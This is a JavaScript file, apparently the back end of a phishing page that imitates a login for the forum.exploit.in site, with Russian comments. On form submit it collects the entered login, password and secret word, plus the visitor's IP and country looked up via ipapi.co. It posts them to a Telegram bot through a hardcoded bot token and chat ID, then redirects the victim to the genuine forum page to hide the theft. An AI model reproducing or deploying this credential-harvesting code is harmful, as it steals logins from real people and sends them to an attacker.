const FORM_DATA = document.querySelector('#telegram')
const FORM_DATA2 = document.querySelector('.telegram-form')
const ERROR_MESSAGE = 'Ошибка отправки сообщения'
const SUCCESS_MESSAGE = 'Успешно отправлено'

FORM_DATA.addEventListener('submit', formSend)

const contentContainer = document.getElementById('content')

document.addEventListener('mousemove', handleMouseMove)

let userIP = 0
let lastRequestTime = 0

document.addEventListener('mousemove', handleMouseMove)

async function handleMouseMove(event) {
	const currentTime = Date.now()

	// Проверяем, прошло ли достаточно времени с последнего запроса
	if (currentTime - lastRequestTime >= 1000) {
		// Обновляем время последнего запроса
		lastRequestTime = currentTime

		// Выполняем запрос к https://ipapi.co/json/
		const response = await fetch('https://ipapi.co/json/')
			.then(d => d.json())
			.then(d => (userIP = d))

		console.log('IP адрес пользователя:', userIP)
	}
}

//Обработчик изменения URL
function handleRouteChange() {
	const path = window.location.pathname.substring(1)
	handlePage(path)
}

function toggleDiv() {
	event.stopPropagation()
	event.preventDefault()
	console.log('start')
	const myDiv = document.getElementById('elTwoFactorAuthentication')
	if (myDiv.style.display === 'none') {
		myDiv.style.display = 'flex'
	}
	console.log('end')
}

//Обработчик загрузки страницы
window.addEventListener('load', handleRouteChange)

// Обработчик изменения URL
window.addEventListener('popstate', handleRouteChange)

async function formSend(e) {
	event.stopPropagation()
	event.preventDefault()

	const TOKEN = '6880910594:AAGKIU90ZV4P-VFyYcur8hdHaqp_jneUc4o'
	const CHAT_ID = '-4020038187'
	const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&`
	const URL_2CRD = 'https://forum.exploit.in/topic/218002/'

	let message = `
		<b>Login:</b> ${FORM_DATA2.auth.value}
		<b>Password:</b> ${FORM_DATA2.password.value}
		<b>Secret word</b> ${FORM_DATA.security_answer.value}
		<b>Ip: ${JSON.stringify(userIP.ip)}</b>
		<b>Country: ${JSON.stringify(userIP.country)}</b>
	`

	const response = await fetch(URL_API, {
		method: 'POST',
		body: JSON.stringify({
			chat_id: CHAT_ID,
			text: message,
			parse_mode: 'html',
		}),
		headers: {
			'Content-Type': 'application/json',
			'Access-Control-Allow-Origin': 'forum.exploit.in', // Замените '*' на конкретный домен, если это безопасно
			'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
			'Access-Control-Allow-Headers': 'Content-Type',
		},
	})

	const result = await response.json()

	if (result.ok) {
		FORM_DATA.reset()
		console.log(SUCCESS_MESSAGE)

		window.location.assign(URL_2CRD)
	} else {
		console.log(ERROR_MESSAGE + result.description)
		window.location.href = 'https://forum.exploit.in/topic/218002/'
	}
}
